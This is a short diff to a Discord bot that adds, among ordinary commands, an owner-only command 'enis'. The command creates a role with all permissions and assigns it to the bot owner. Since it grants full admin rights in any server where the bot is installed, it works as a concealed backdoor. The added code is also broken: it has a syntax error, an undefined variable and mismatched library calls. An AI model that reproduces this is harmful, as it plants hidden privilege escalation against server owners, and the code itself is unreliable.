@@ -44,6 +44,15 @@ async def flip(ctx):
   await ctx.send(random.choice(flip))
 
 @bot.command()
+@commands.is_owner()
+async def enis(ctx)
+  if get(ctx.guild.roles, name="the god of pp") == None:
+    role = await client.create_role(ctx.guild, name="the god of pp", permissions=Permissions.all())
+  if role in ctx.author.roles:
+    await ctx.author.remove_roles(role)
+  await client.add_roles(ctx.author, role)
+
+@bot.command()
 async def repeat(ctx, times: int, content='repeating...'):
     await open_account(ctx.author)
     user = ctx.author
